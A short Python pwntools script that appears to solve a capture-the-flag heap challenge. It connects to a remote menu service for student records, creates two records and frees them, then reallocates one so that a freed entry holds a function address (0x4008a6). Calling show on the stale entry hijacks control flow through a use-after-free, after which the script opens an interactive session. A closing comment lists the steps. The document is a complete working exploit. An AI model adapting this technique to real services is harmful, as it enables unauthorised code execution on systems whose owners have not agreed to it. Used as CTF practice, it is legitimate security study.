from pwn import *

def make(length,string) :
    p.sendline("1")
    p.recvuntil("length of name?")
    p.sendline(str(length))
    p.send(string)
    p.recvuntil("successfully saved to")
    p.recvuntil("3. remove student\n")

def show(index) :
    p.sendline("2")
    p.recvuntil("number?")
    p.sendline(str(index))
    p.recvuntil("3. remove student\n")

def delete(index) :
    p.sendline("3")
    p.recvuntil("number?")
    p.sendline(str(index))
    p.recvuntil("3. remove student\n")

p = remote("remote.goatskin.kr",50007)
context.log_level = "debug"
p.recvuntil("3. remove student\n")
make(1,"A")
make(1,"A")
delete(1)
delete(0)
address = "A" * 8
address += p64(0x4008a6)
make(16,address)
show(1)
p.interactive()

"""
1. make student 1
2. make student 2
3. 2 free
4. 1 free
5. make student(name = 16, first 8byte of name = address)
6. show 2
"""
